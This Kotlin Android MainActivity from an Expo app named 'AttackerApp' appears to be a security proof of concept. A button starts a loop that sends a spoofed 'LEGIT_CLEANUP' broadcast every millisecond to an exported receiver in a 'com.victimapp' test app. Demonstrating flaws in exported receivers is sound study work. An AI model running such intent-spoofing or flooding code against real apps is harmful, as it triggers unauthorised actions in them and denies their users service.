package com.attackerapp

import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.util.Log
import android.content.ComponentName
import android.content.Intent
import android.widget.Button
import android.widget.Toast

import androidx.appcompat.app.AppCompatActivity

import com.facebook.react.ReactActivity
import com.facebook.react.ReactActivityDelegate
import com.facebook.react.defaults.DefaultNewArchitectureEntryPoint.fabricEnabled
import com.facebook.react.defaults.DefaultReactActivityDelegate

import expo.modules.ReactActivityDelegateWrapper

class MainActivity : ReactActivity() {

    private val TAG = "AttackerApp"
    private val handler = Handler(Looper.getMainLooper())
    private var spamming = false
    private lateinit var spamButton: Button

  override fun onCreate(savedInstanceState: Bundle?) {
    // Set the theme to AppTheme BEFORE onCreate to support
    // coloring the background, status bar, and navigation bar.
    // This is required for expo-splash-screen.
    setTheme(R.style.AppTheme);
    super.onCreate(null)

    spamButton = Button(this).apply {
      text = "🔥 Start Spamming Cleanup"
      setOnClickListener {
        if (!spamming) {
          startSpam()
          text = "⏹️ Stop Spamming"
        } else {
          stopSpam()
          text = "🔥 Start Spamming Cleanup"
        }
      }
    }

    // Set the content view to the button
    setContentView(spamButton)
  }

    private val spamRunnable = object : Runnable {
        override fun run() {
        sendSpam()
        handler.postDelayed(this, 1) // Every 1ms
        }
    }

    private fun startSpam() {
        spamming = true
        handler.post(spamRunnable)
        Toast.makeText(this, "🚨 Started spamming LEGIT_CLEANUP", Toast.LENGTH_SHORT).show()
        Log.i(TAG, "Spamming started")
    }

    private fun stopSpam() {
        spamming = false
        handler.removeCallbacks(spamRunnable)
        Toast.makeText(this, "✅ Stopped spamming", Toast.LENGTH_SHORT).show()
        Log.i(TAG, "Spamming stopped")
    }



   private fun sendSpam() {
        try {
            val intent = Intent("com.victimapp.CLEANUP")
            intent.component = ComponentName("com.victimapp", "com.victimapp.MySensitiveReceiver")
            intent.putExtra("payload", "LEGIT_CLEANUP")
            intent.putExtra("caller_package", applicationContext.packageName)

            sendBroadcast(intent)

            // Toast.makeText(this, "📤 Sent LEGIT_CLEANUP", Toast.LENGTH_SHORT).show()
            Log.d(TAG, "Broadcast sent: LEGIT_CLEANUP")
        } catch (e: Exception) {
            Toast.makeText(this, "❌ Broadcast error: ${e.message}", Toast.LENGTH_SHORT).show()
            Log.e(TAG, "Broadcast failed", e)
        }
  }

  /**
   * Returns the name of the main component registered from JavaScript. This is used to schedule
   * rendering of the component.
   */
  override fun getMainComponentName(): String = "main"

  /**
   * Returns the instance of the [ReactActivityDelegate]. We use [DefaultReactActivityDelegate]
   * which allows you to enable New Architecture with a single boolean flags [fabricEnabled]
   */
  override fun createReactActivityDelegate(): ReactActivityDelegate {
    return ReactActivityDelegateWrapper(
          this,
          BuildConfig.IS_NEW_ARCHITECTURE_ENABLED,
          object : DefaultReactActivityDelegate(
              this,
              mainComponentName,
              fabricEnabled
          ){})
  }

  /**
    * Align the back button behavior with Android S
    * where moving root activities to background instead of finishing activities.
    * @see <a href="https://developer.android.com/reference/android/app/Activity#onBackPressed()">onBackPressed</a>
    */
  override fun invokeDefaultOnBackPressed() {
      if (Build.VERSION.SDK_INT <= Build.VERSION_CODES.R) {
          if (!moveTaskToBack(false)) {
              // For non-root activities, use the default implementation to finish them.
              super.invokeDefaultOnBackPressed()
          }
          return
      }

      // Use the default back button implementation on Android S
      // because it's doing more than [Activity.moveTaskToBack] in fact.
      super.invokeDefaultOnBackPressed()
  }
}
